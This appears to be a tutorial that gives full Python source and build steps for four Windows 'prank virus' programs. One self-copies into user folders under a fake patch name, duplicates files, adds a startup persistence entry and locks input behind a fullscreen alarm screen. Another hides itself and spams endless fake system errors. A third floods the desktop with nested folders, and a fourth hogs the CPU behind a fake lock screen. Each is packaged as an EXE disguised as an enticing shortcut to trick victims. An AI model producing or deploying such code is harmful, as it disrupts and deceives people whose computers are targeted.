## MALWARE

### Step 2: Setup your Virtual Environment

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```
 ### Step 3: Install Required Libraries

```bash
pip install pygame
```

### Step 4: infecto.py

```bash
import os, shutil, random, time, datetime, tkinter as tk, pygame
from threading import Thread

# ===== CONFIG =====
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    "C:\\Temp"
]
FAKE_EXT = ".infected"
ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
SIM_DURATION = 20
SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
# ==================

log = []

def log_event(event, box=None):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {event}"
    log.append(entry)
    print(entry)
    if box:
        box.insert(tk.END, entry + "\n")
        box.see(tk.END)

def save_log():
    """Save IOC log to Desktop after infection ends"""
    try:
        fname = os.path.join(SAVE_DIR, "infection_log.txt")
        with open(fname, "w") as f:
            for entry in log:
                f.write(entry + "\n")
        print(f"[+] Infection log saved at: {fname}")
    except Exception as e:
        print(f"[!] Could not save log: {e}")

def spread_self(log_box=None):
    exe_path = os.path.abspath(__file__)
    for d in TARGET_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
            shutil.copy(exe_path, target)
            log_event(f"Copied to {target}", log_box)
        except Exception as e:
            log_event(f"Spread failed: {e}", log_box)

def infect_files(log_box=None):
    for d in TARGET_DIRS:
        try:
            for fname in os.listdir(d):
                fpath = os.path.join(d, fname)
                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
                    infected = fpath + FAKE_EXT
                    shutil.copy(fpath, infected)
                    log_event(f"File infected: {infected}", log_box)
        except:
            pass

def simulate_persistence(log_box=None):
    try:
        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        os.makedirs(startup, exist_ok=True)
        dummy = os.path.join(startup, "startup_infect.bat")
        with open(dummy, "w") as f:
            f.write("echo Fake persistence simulation - no real damage.")
        log_event(f"Persistence simulated at: {dummy}", log_box)
    except Exception as e:
        log_event(f"Persistence failed: {e}", log_box)

def play_alert():
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(ALARM_FILE)
        pygame.mixer.music.play(-1)
        print(f"[+] Playing sound from {ALARM_FILE}")
    except Exception as e:
        log_event(f"Alert sound error: {e}")

# --- Fullscreen infection GUI ---
def infection_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.wm_attributes("-topmost", 1)

    # disable exit + keyboard
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind_all("<Key>", lambda e: "break")
    root.bind_all("<Alt-Key>", lambda e: "break")

    warning = tk.Label(
        root,
        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
        fg="red",
        bg="black",
        font=("Consolas", 42, "bold")
    )
    warning.place(relx=0.5, rely=0.3, anchor="center")

    submsg = tk.Label(
        root,
        text="Do not turn off your computer.\nFiles are being corrupted...",
        fg="yellow",
        bg="black",
        font=("Consolas", 20)
    )
    submsg.place(relx=0.5, rely=0.42, anchor="center")

    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
    log_box.place(relx=0.5, rely=0.75, anchor="center")

    # Animation vars
    direction = 1
    y_pos = 0.3
    start_time = time.time()

    while time.time() - start_time < SIM_DURATION:
        # Move the red warning up and down
        y_pos += 0.003 * direction
        if y_pos > 0.35 or y_pos < 0.25:
            direction *= -1
        warning.place(relx=0.5, rely=y_pos, anchor="center")

        # Fake infection events
        if random.random() < 0.25:
            fake_event = random.choice([
                "Injected into explorer.exe",
                "Modified registry key HKCU\\Run",
                "Spawned process: svchost32.exe",
                "Spreading to Documents folder",
                "Memory hook installed"
            ])
            log_event(fake_event, log_box)

        root.update()
        time.sleep(0.2)

    root.destroy()
    save_log()  

# --- MAIN ---
def main():
    Thread(target=spread_self, daemon=True).start()
    Thread(target=infect_files, daemon=True).start()
    Thread(target=simulate_persistence, daemon=True).start()
    Thread(target=play_alert, daemon=True).start()
    infection_screen()

if __name__ == "__main__":
    main()

```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: ghost
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into ghost
- Move the ghost.ico to your folder

Paste this: 
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=ghost.ico ghost_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus1\dist\ghost_prank.exe
- Name it "TRICK OR TREAT"
- Right-click shortcut → Properties → Change Icon → Select your ghost.ico

# Virus 2

### Step 1: Inside the malware folder add a new folder (vs code) name it virus2

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus2
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: Fake_error.py
```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"

# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```
Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

# Virus 4
### Step 1: Create new folder (vs code) CPU_Hog
### Create New Text file: CPU_Hog.py

Paste this:
```bash
import threading
import time
import hashlib
import os
import tkinter as tk
import winsound  # Windows only
import sys
from datetime import datetime

# === Setup ===
os.makedirs("logs", exist_ok=True)
LOG_FILE = "logs/dos_log.txt"

# === Resource Path for PyInstaller ===
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

ALARM_FILE = resource_path("alarm.wav")

# === Logging ===
def log(msg):
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {msg}\n")

# === CPU Hog ===
def hog_cpu(name):
    log(f"CPU thread started: {name}")
    while True:
        hashlib.sha256(name.encode()).hexdigest()

# === Alarm Sound ===
def play_alarm():
    try:
        if not os.path.exists(ALARM_FILE):
            log("Alarm file not found.")
            return
        winsound.PlaySound(ALARM_FILE, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
        log("Alarm started.")
    except Exception as e:
        log(f"Alarm failed: {e}")

# === Fullscreen Locker ===
def show_screen_locker():
    play_alarm()
    root = tk.Tk()
    root.title("LOCKED")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    tk.Label(root, text="🔒 SYSTEM LOCKED", fg="red", bg="black", font=("Arial", 36)).pack(pady=100)
    tk.Label(root, text="ALERT: Unauthorized access detected.\nThis machine is now locked.",
             fg="white", bg="black", font=("Arial", 16)).pack()
    tk.Button(root, text="Fake Unlock",
              command=lambda: (winsound.PlaySound(None, winsound.SND_PURGE), root.destroy()),
              font=("Arial", 14)).pack(pady=20)

    root.mainloop()

# === Main ===
def main():
    log("Simulation started.")
    for i in range(1):  # You can increase to 3–5 threads if desired
        threading.Thread(target=hog_cpu, args=(f"cpu_{i}",), daemon=True).start()
    time.sleep(0.5)
    log("Triggering lock screen...")
    show_screen_locker()
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
```
### Create New Text file: process_name.txt
Paste this:
```bash
svchost
chrome
explorer
systemd
powershell
lsass
smss
pythonw
rundll32
conhost
```
### Create logs Folder

### CreateCPU_Hog.spec
Paste this:
```bash
# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['CPU_Hog.py'],
    pathex=[],
    binaries=[],
    datas=[('alarm.wav', '.')],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='CPU_Hog',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
```

Install:
```bash
pip install pyinstaller
```

To make EXE:
```bash
pyinstaller --onefile --noconsole CPU_Hog.py
```

